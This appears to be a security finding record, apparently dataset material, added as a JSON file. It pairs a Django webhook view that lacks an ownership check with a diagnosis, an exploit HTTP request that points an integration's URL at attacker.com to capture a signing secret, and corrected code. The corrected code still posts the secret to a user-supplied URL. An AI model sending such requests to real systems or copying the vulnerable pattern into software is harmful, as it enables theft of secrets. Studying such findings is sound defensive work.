@@ -1,0 +1,8 @@
+{
+  "vulnerable_code": "@require_POST\ndef update_integration_endpoint(request, integration_id):\n    integration = ExternalWebhookIntegration.objects.get(id=integration_id)\n    integration.target_url = request.POST.get('target_url')\n    integration.save(update_fields=['target_url'])\n    return JsonResponse({'status': 'updated'})\n\n@receiver(post_save, sender=ExternalWebhookIntegration)\ndef dispatch_verification_handshake(sender, instance, **kwargs):\n    requests.post(instance.target_url, json={'signing_secret': instance.shared_secret})",
+  "diagnosis": "The view retrieves and updates ExternalWebhookIntegration using integration_id from the URL without verifying ownership. Upon saving, a post_save signal fires an HTTP POST containing the integration's shared_secret to target_url, allowing an attacker to exfiltrate signing secrets to their own server.",
+  "exploit_request": "POST /api/integrations/4412/endpoint/ HTTP/1.1\nHost: api.example.com\nCookie: sessionid=attacker_session\nContent-Type: application/x-www-form-urlencoded\n\ntarget_url=https%3A%2F%2Fattacker.com%2Fcatch",
+  "corrected_code": "@require_POST\ndef update_integration_endpoint(request, integration_id):\n    integration = get_object_or_404(ExternalWebhookIntegration, id=integration_id, organization=request.user.organization)\n    integration.target_url = request.POST.get('target_url')\n    integration.save(update_fields=['target_url'])\n    return JsonResponse({'status': 'updated'})\n\n@receiver(post_save, sender=ExternalWebhookIntegration)\ndef dispatch_verification_handshake(sender, instance, **kwargs):\n    requests.post(instance.target_url, json={'signing_secret': instance.shared_secret})",
+  "severity": "CRITICAL",
+  "confidence": 0.97
+}
